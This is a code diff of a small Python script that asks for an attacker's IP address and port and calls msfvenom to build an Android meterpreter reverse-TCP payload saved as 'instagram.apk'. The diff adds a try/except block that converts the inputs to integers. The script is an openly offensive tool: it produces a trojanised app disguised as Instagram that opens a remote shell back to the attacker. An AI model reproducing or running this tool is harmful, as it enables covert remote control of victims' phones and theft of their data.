@@ -14,6 +14,16 @@ lhost = input("what is your IP Address ==>")
 
 lport = input("what is your PORT ==>")
 
+try:
+  
+  lhost=int(lhost)
+  
+  lport=int(lport)
+  
+except:
+  
+  pass
+
 subprocess.call(" msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " R >instagram.apk", shell=True)
 
 input("your file has been saved as instagram.apk press enter to continue ==>")
